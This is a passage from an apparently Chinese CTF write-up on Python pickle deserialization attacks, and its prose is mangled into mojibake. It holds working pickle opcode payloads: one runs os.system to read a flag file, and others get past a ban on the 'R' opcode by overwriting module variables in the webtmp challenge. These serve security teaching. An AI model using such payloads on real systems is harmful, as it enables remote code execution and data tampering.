&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.sys.modules[&amp;#39;&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#d88200">&amp;#39;].system(&amp;#39;&lt;/span>&lt;span style="color:#111">cat&lt;/span> &lt;span style="color:#f92672">../&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;quot;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS'__import__'\ng2\nsg0\nS'structs'\ng1\nscstructs\nget\np5\n0g5\n(S'eval'\ntRp6\n0g6\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\ntR.&amp;quot;
&lt;/code>&lt;/pre>&lt;/details>
&lt;h3 id="ç¦æ­¢bræ“ä½œç ">ç¦æ­¢&lt;code>b'R'&lt;/code>æ“ä½œç &lt;/h3>
&lt;p>ä¹Ÿå°±ç›¸å½“äºä¸å¯ä»¥ç”¨&lt;code>__reduce__&lt;/code>ï¼Œæœ‰ä»¥ä¸‹å‡ ç§åº”å¯¹æ–¹æ³•ï¼ˆä»¥ä¸‹æ–¹æ³•åŒæ ·å¯ä»¥å•ç‹¬ä½¿ç”¨é¸­ï¼ï¼ï¼ï¼‰ï¼Œå˜é‡è¦†ç›–ï¼ˆæ— ç›´æ¥ä»£ç æ‰§è¡Œï¼‰æˆ–åˆ©ç”¨&lt;code>b'i'&lt;/code>ï¼Œ&lt;code>b'i'&lt;/code>ï¼Œ&lt;code>b'b'&lt;/code>è¿™äº›æ“ä½œç æ¥rceã€‚&lt;/p>
&lt;h3 id="--å˜é‡è¦†ç›–">&amp;ndash;&amp;raquo;å˜é‡è¦†ç›–&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­7 - [é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›2020] webtmp
&lt;/h4>
&lt;/summary>
&lt;p>ï¼ˆè¿™ä¸ªé¢˜æ˜¯ç¼åˆçš„[SJTU 2019]Pickle ä»¥åŠ [SJTU 2019]Pickle-Revengeçš„é¢˜ = =ã€‚é™åˆ¶äº†&lt;code>R&lt;/code>æ“ä½œç ï¼ŒåŒæ—¶é‡å†™&lt;code>find_class()&lt;/code>é™åˆ¶å¼•å…¥æ¨¡å—ä¸º&lt;code>__main__&lt;/code>ï¼Œä¸¤ä¸ªè€ƒç‚¹ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">secret&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__repr__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;Animal(name=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">, category=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__eq__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">Animal&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;source&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">mimetype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;text/plain&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">pickle_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;No... I don&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t like R-things. No Rabits, Rats, Roosters or RCEs.&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Are you sure that is an animal???&amp;#39;&lt;/span>
&lt;span style="color:#111">correct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unpickle_result.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">giveflag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">correct&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">repr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Something wrong&amp;#34;&lt;/span>
&lt;span style="color:#111">sample_obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ä¸€ç»™æˆ‘å“©giaogiao&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Giao&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pickle_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unpickle_page.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹æºç ï¼Œopcodeéƒ¨åˆ†banæ‰äº†&lt;code>R&lt;/code>æ“ä½œç ï¼ˆè°ƒç”¨ä¸€ä¸ªcallableå¯¹è±¡ï¼‰ï¼Œä¸èƒ½ç”¨&lt;code>__reduce__&lt;/code>äº†ï¼›ä¹Ÿé‡å†™äº†&lt;code>find_class()&lt;/code>ï¼Œmoduleå¿…é¡»æ˜¯&lt;code>__main__&lt;/code>ï¼›æˆ‘ä»¬çš„ç›®æ ‡æ˜¯&lt;/p>
&lt;p>&lt;code>restricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)&lt;/code>ä¸ºçœŸï¼Œå³correct==True&lt;/p>
&lt;p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡åŠ è½½&lt;code>__main__.secret&lt;/code>å¯ä»¥å¼•å…¥secretæ¨¡å—ï¼Œæ¥æŠŠ&lt;code>secret.name&lt;/code>å’Œ&lt;code>secret.category&lt;/code>è¿™ä¸¤ä¸ªå˜é‡è¦†ç›–ä¸ºä»»æ„å­—ç¬¦ä¸²ï¼Œå†ä»¥è¿™ä¸ªå­—ç¬¦ä¸²ä¸ºå‚æ•°æ„é€ Animalå¯¹è±¡ï¼ˆæ ˆé¡¶å¯¹äºtypeçš„æ£€æŸ¥ï¼‰&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">secret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>
&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;span style="color:#75715e"># b&amp;#34;c__main__\nsecret\np0\n0g0\n(}(S&amp;#39;name&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ndtbg0\n(}(S&amp;#39;category&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ndtb(S&amp;#39;frieggs&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ni__main__\nAnimal\np3\n0g3\n.&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æ„é€ çš„exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__repr__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;Animal(name=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">, category=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__eq__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">Animal&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;y&amp;#34;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”æ‰€ä»¥åœ¨ä¸å…è®¸&lt;code>b'R'&lt;/code>çš„æƒ…å†µä¸‹ï¼Œæ€è·¯åˆ™æ˜¯ç¯¡æ”¹secretä¸­çš„nameå’Œcategoriyï¼Œå•çº¯çš„ç”¨&lt;code>b'c'&lt;/code>å¼•å…¥æ¨¡å—å¯¹Animalè¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™ä¸€è¿‡ç¨‹ä¹Ÿç›¸å½“äºæ˜¯æ‰§è¡Œäº†å‡½æ•°&lt;/p>
&lt;/details>
&lt;p>ä¸€ç§è§£å†³åŠæ³•å°±æ˜¯è¿™ä¸ªæ —å­ä¸­çš„ï¼Œå¹²è„†å°±ä¸rceï¼Œè€Œæ˜¯ç”¨&lt;code>b'c'&lt;/code>å˜é‡è¦†ç›–ï¼Œæ€è·¯å°±æ˜¯ä¸Šä¸ªä¸‰çº§æ ‡é¢˜ä¸‹é¢çš„é‚£ä¸ªå¤§æ®µï¼Œä¸å†èµ˜è¿°ã€‚&lt;/p>
